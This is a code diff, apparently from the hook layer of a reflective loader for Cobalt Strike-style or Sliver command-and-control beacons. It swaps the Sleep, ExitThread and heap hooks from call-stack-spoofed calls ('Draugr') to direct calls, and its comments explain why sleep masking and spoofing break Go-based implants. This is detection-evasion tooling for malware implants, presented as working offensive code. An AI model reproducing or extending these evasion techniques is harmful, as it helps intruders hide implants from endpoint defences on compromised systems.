@@ -55,63 +55,42 @@ void setup_memory ( MEMORY_LAYOUT * layout )
 
 VOID WINAPI _Sleep ( DWORD dwMilliseconds )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
-    call.argc = 1;
-
-    call.args [ 0 ] = spoof_arg ( dwMilliseconds );
-
     /*
-     * XOR sleep mask deliberately omitted for Go/Sliver compatibility.
-     * The mask XORs all beacon DLL sections in-place; Go's scheduler runs
-     * other goroutines on other OS threads while this thread is sleeping,
-     * so those threads would execute XOR-scrambled code → crash.
-     * Stack-spoof the Sleep call only.
+     * Do NOT use spoof_call / Draugr here.
+     *
+     * Draugr holds a fake BaseThreadInitThunk/RtlUserThreadStart call stack on
+     * the OS thread for the full sleep duration.  Go's sysmon goroutine fires
+     * its async preemptor (via SuspendThread + SetThreadContext injection) every
+     * ~10 ms.  Each injection sees the fake stack, corrupts the goroutine's
+     * g.sched.sp save area, and after sleep returns the next memmove reads a
+     * ~1-billion-byte count from the corrupted goroutine struct → crash.
+     *
+     * XOR sleep mask is also omitted: masking beacon DLL sections in-place
+     * while Go goroutines on other OS threads keep executing would cause those
+     * threads to run XOR-scrambled code.
      */
-    spoof_call ( &call );
+    KERNEL32$Sleep ( dwMilliseconds );
 }
 
 VOID WINAPI _ExitThread ( DWORD dwExitCode )
 {
     /*
-     * cleanup_memory deliberately omitted for Go/Sliver compatibility.
-     * The original code freed dll_dst + pico_code here, which was correct
-     * for single-threaded CS beacons (one ExitThread = beacon done).
-     * For Go DLLs, Go's init goroutine calls ExitThread when runtime.main()
-     * returns, but the beacon goroutine is still alive and running beacon
-     * code from dll_dst.  Freeing dll_dst here = use-after-free crash.
-     * Just stack-spoof the ExitThread call; the OS will reclaim memory when
-     * the process eventually exits.
+     * cleanup_memory omitted: freeing dll_dst while other goroutines are
+     * still running it causes use-after-free (Go's init thread calls
+     * ExitThread before the beacon goroutine finishes).
+     *
+     * spoof_call / Draugr omitted: same Go async preemption hazard as the
+     * other hooks — see hooks.c for details.  ExitThread doesn't return, so
+     * the OS reclaims all memory on process exit anyway.
      */
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
-    call.argc = 1;
-
-    call.args [ 0 ] = spoof_arg ( dwExitCode );
-
-    spoof_call ( &call );
+    KERNEL32$ExitThread ( dwExitCode );
 }
 
 LPVOID WINAPI _HeapAlloc ( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
 {
-    LPVOID result = NULL;
-
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$HeapAlloc );
-    call.argc = 3;
-    
-    call.args [ 0 ] = spoof_arg ( hHeap );
-    call.args [ 1 ] = spoof_arg ( dwFlags );
-    call.args [ 2 ] = spoof_arg ( dwBytes );
-
-    result = ( LPVOID ) spoof_call ( &call );
-    if ( !result ) { result = KERNEL32$HeapAlloc ( hHeap, dwFlags, dwBytes ); }
+    LPVOID result = KERNEL32$HeapAlloc ( hHeap, dwFlags, dwBytes );
 
     /* store a record of this heap allocation */
-
     if ( dwBytes >= 256 && result != NULL && g_memory.Heap.Count < MAX_HEAP_RECORDS )
     {
         g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
@@ -124,18 +103,7 @@ LPVOID WINAPI _HeapAlloc ( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
 
 LPVOID WINAPI _HeapReAlloc ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$HeapReAlloc );
-    call.argc = 4;
-    
-    call.args [ 0 ] = spoof_arg ( hHeap );
-    call.args [ 1 ] = spoof_arg ( dwFlags );
-    call.args [ 2 ] = spoof_arg ( lpMem );
-    call.args [ 3 ] = spoof_arg ( dwBytes );
-
-    LPVOID result = ( LPVOID ) spoof_call ( &call );
-    if ( !result ) { result = KERNEL32$HeapReAlloc ( hHeap, dwFlags, lpMem, dwBytes ); }
+    LPVOID result = KERNEL32$HeapReAlloc ( hHeap, dwFlags, lpMem, dwBytes );
 
     if ( result )
     {
@@ -166,17 +134,7 @@ LPVOID WINAPI _HeapReAlloc ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T d
 
 BOOL WINAPI _HeapFree ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$HeapFree );
-    call.argc = 3;
-    
-    call.args [ 0 ] = spoof_arg ( hHeap );
-    call.args [ 1 ] = spoof_arg ( dwFlags );
-    call.args [ 2 ] = spoof_arg ( lpMem );
-
-    BOOL result = ( BOOL ) spoof_call ( &call );
-    if ( !result ) { result = KERNEL32$HeapFree ( hHeap, dwFlags, lpMem ); }
+    BOOL result = KERNEL32$HeapFree ( hHeap, dwFlags, lpMem );
 
     if ( result )
     {
